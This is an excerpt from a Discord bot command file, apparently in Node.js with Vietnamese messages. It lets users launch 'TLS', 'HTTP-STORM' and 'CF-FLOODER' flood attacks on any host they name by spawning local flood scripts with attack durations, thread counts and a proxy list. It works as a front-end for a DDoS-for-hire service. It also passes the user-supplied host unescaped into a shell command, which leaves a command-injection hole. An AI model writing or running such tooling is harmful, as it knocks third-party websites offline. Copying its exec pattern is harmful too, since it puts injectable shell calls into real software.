...
module.exports = {
    ...
    options: [
    {
      ...
      type: "STRING",
      choices: [
      { name: `TLS`, value: `TLS`, inline: true },
      { name: `HTTP-STORM`, value: `HTTP-STORM`, inline: true },
      { name: `CF-FLOODER`, value: `CF-FLOODER`, inline: true },
      ],
    },
    {
      name: "host",
  ...
  run: async (client, interaction) => {
    ...
    const roombasic = ayarlar.commandroom.BASIC
    if (interaction.channel.id != roombasic)
      return interaction.reply({
        embeds: [
          new MessageEmbed()
          .setColor("RANDOM")
            .setDescription(`Chỉ dùng được lệnh này trong <#${roombasic}>.`)
   ...
   const host = interaction.options.getString("host")
    ...
    if(methods === "HTTP-STORM") {
         
      var chetmemay = methods;
  
      var exec = require('child_process').exec
        exec(`node methods/L7/${chetmemay}.js ${host} 60 storm 5`, (error, stdout, stderr) => {
      });
      ...
      var randomgif = gifler[Math.floor((Math.random() * gifler.length))]
        const embed = new MessageEmbed()
          ...
          if(methods === "CF-FLOODER") {
         
            var chetmemay = methods;
        
            var exec = require('child_process').exec
              exec(`node methods/L7/${chetmemay}.js GET ${host} proxy.txt 60 500 5`, (error, stdout, stderr) => {
            });
...
if(methods === "TLS") {
    ...
    var exec = require('child_process').exec
      exec(`node methods/L7/${chetmemay}.js ${host} ${'5 5 60'}`, (error, stdout, stderr) => {
    });
